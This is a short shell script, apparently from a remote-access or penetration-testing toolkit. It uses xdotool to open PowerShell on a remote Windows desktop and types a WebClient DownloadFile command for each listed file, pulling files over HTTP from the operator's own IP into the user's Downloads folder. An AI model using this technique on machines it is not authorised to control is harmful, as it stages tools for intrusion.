mouseover 10 10000 win.png && xdotool click 1
mouseover 10 10000 powershell.png && xdotool click 1
mouseover 10 10000 maximize.png && xdotool click 1
sleep 10

IP=$(myip | grep external | cut -d: -f2)

cat /tmp/files | while read line
do
    FILENAME=$(basename $line)
    xdotool type --delay 200 '(New-Object System.Net.WebClient).DownloadFile("http://'$IP'/'$FILENAME'","$ENV:UserProfile\Downloads\'$FILENAME'")'
    xdotool key Return
    sleep 10
done

